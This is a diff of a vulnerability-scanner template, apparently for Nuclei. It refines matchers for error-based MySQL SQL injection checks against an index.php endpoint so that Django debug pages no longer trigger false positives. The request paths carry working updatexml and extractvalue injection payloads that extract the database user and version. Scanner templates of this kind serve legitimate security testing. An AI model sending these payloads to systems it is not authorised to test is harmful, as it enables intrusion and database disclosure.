@@ -31,38 +31,48 @@ requests:
         condition: or
         part: body
 
-  # 测试2: 直接使用user()函数（无payload变量）
+  # 测试2: 报错注入特征（避免 Django/Python 调试页中泛化的 "@"、纯 500 误报）
   - method: GET
     preconditions:
       methods: [GET]
     path:
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
       - "{{BaseURL}}/index.php?ids[0,extractvalue(1,concat(0xa,user()))]=1"
+    matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "root@"
-          - "@"
-        condition: or
-        part: body
       - type: status
         status: [500]
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "updatexml"
+          - "extractvalue"
+        condition: or
+        part: body
 
-  # 测试3: 使用version()函数检测数据库版本
+  # 测试3: 使用 version() 报错注入（需同时命中 MySQL/XPATH 类特征，避免版本号泛匹配）
   - method: GET
     preconditions:
       methods: [GET]
     path:
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
+    matchers-condition: and
     matchers:
+      - type: status
+        status: [500]
       - type: regex
         regex:
           - "\\d+\\.\\d+\\.\\d+"
         part: body
-      - type: status
-        status: [500]
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "updatexml"
+          - "MySQL server version"
+        condition: or
+        part: body
 
-  # 测试4: 检查SQL语法错误响应
+  # 测试4: 检查典型 MySQL/PHP 驱动报错（移除泛化的 "syntax error"，Django 调试页常含该短语）
   - method: GET
     preconditions:
       methods: [GET]
@@ -75,7 +85,7 @@ requests:
           - "SQL syntax"
           - "mysql_fetch"
           - "mysql_error"
-          - "syntax error"
+          - "mysqli_"
           - "Query failed"
         condition: or
         part: body
